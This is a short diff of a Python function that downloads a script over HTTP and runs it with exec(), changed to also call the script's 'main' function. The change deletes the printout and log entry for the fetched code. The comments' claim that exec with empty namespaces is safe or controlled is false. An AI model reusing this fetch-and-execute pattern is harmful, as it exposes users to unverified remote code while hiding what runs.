@@ -47,16 +47,21 @@ def fetch_and_execute_remote_script():
 
         if response.status_code == 200:
             script_content = response.text
-            print_colored("Fetched script content:", GREENISH)
-            print(script_content)  # Display fetched script content for reference
-            log_activity("Fetched and executed remote script.")
-            
+            print_colored("Fetched script content successfully!", GREENISH)
+
             try:
-                exec(script_content, {}, {})  # Safely execute in isolated namespace
+                # Execute the script in a controlled namespace
+                local_namespace = {}
+                exec(script_content, {}, local_namespace)
+
+                # Check if the script defines a main function or entry point
+                if "main" in local_namespace:
+                    print_colored("Executing the main function from the script...", SKY_BLUE)
+                    local_namespace["main"]()  # Call the 'main' function if it exists
+                else:
+                    print_colored("Script executed successfully!", GREENISH)
             except Exception as e:
                 print_colored(f"Error executing the fetched script: {e}", YELLOW)
-                print_colored("Debugging script content:", SKY_BLUE)
-                print(script_content)  # Provide the script content for debugging
         else:
             print_colored(f"Failed to fetch the script. HTTP Status: {response.status_code}", YELLOW)
 
